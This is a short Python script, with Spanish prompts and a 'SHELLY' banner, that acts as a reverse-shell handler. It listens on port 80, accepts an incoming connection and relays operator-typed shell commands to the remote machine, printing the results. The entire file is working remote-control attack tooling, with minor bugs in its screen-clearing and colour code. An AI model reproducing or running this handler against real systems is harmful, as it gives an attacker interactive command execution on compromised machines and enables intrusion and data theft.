import socket, argparse, os
from colorama import *
parser = argparse.ArgumentParser()
parser.add_argument('--target', '-t', help="Indica la IP objetivo")
args = parser.parse_args()
def c():
    if os.name=="nt":os.system("cls")
    else:os.system("clear")
class c:
    R=Style.BRIGHT+Fore.RED
    W=Style.BRIGHT+Fore.WHITE
    R=Style.RESET_ALL+Fore.RESET
def p():
    c()
    t='''
███████╗██╗  ██╗███████╗██╗     ██╗  ██╗   ██╗
██╔════╝██║  ██║██╔════╝██║     ██║  ╚██╗ ██╔╝
███████╗███████║█████╗  ██║     ██║   ╚████╔╝ 
╚════██║██╔══██║██╔══╝  ██║     ██║    ╚██╔╝  
███████║██║  ██║███████╗███████╗███████╗██║   
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  
'''
    print(c.R+t)
H=args.target
P=80
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((H,P))
s.listen(1)
p()
print(c.W+f'[*] Escuchando conexiones en {H}:{P}')
n,a=s.accept()
print(c.W+f'[+] Conexión entrante: {a[0]}:{a[1]}')
while True:
    e=input(c.W+f'shelly@{P}:~$ ')
    n.send(e.encode())
    if e.strip()=='exit':break
    o = n.recv(1024).decode()
    print(c.W+o)
n.close()
